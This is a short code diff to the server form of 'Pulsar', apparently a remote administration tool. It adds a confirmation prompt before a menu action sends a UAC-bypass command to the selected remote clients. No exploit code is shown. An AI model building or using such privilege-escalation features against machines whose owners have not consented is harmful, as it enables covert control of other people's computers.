@@ -1074,9 +1074,21 @@ namespace Pulsar.Server.Forms
 
         private void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (Client c in GetSelectedClients())
+            var selectedClients = GetSelectedClients();
+            if (selectedClients.Length == 0) return;
+
+            var result = MessageBox.Show(
+                $"Are you sure you want to attempt UAC bypass on {selectedClients.Length} client(s)? If Pulsar is being ran in memory, it will fail and you will loose the client until their computer is restarted or until the client file is rerun.",
+                "Confirm UAC Bypass",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Warning);
+
+            if (result == DialogResult.Yes)
             {
-                c.Send(new DoUACBypass());
+                foreach (Client c in selectedClients)
+                {
+                    c.Send(new DoUACBypass());
+                }
             }
         }
 
